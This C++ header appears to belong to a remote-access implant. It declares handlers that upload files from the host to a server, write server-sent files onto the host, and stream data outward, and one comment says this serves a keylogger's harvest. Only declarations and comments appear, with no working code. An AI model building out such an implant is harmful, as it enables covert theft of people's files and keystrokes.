// ========================================== { START OF FILE } ========================================== //
#pragma once

#include <string>

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands::exec {

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
    /// Handles a file upload: POST the local file to the server. Task type UPLOAD (7);
    /// Command.Path is the local file, Command.TransferID identifies the transfer.
    /// <para>
    /// Files below 100 MB go in one request to <c>/api/files/{agentKey}/{fileName}/file</c>; larger
    /// files are streamed as 10 MB chunks to <c>…/{transferId}/chunks/{n}</c> and the server is asked
    /// to rebuild them. Geometry ported from <c>clean/test</c> <c>FileTransfer::SendFile</c>
    /// (commit <c>2bf3048</c>).
    /// </para>
    CommandResult HandleUpload(const models::CheckinResponse& task);

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
    /// Handles a file download. Task type DOWNLOAD (6); Command.Path is the destination on this
    /// host. The server normally rewrites the task into a chunk payload (<c>Command.Data</c> =
    /// base64 bytes, <c>Offset</c>, <c>TotalBytes</c>, <c>Final</c>); offset 0 truncates the
    /// destination and later chunks append, as <c>Agent::DownloadFile</c> does on <c>clean/test</c>.
    /// A task that was not rewritten falls back to fetching the whole file.
    CommandResult HandleDownload(const models::CheckinResponse& task);

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
    /// Appends one piece of continuous data to a server-side stream
    /// (<c>POST /api/streams/{agentKey}/{streamId}/data</c>). Used by the keylogger's harvest.
    /// Ported from <c>clean/test</c> <c>FileTransfer::SendStreamData</c> (commit <c>ffaed03</c>).
    /// <param name="stream_id">Stream identifier; the keylogger uses the task id.</param>
    /// <param name="data">The bytes to append.</param>
    /// <returns>True when the server answered 2xx.</returns>
    bool PostStreamData(const std::string& stream_id, const std::string& data);

}  // namespace agent::commands::exec
   // ========================================== { END OF FILE } ========================================== //
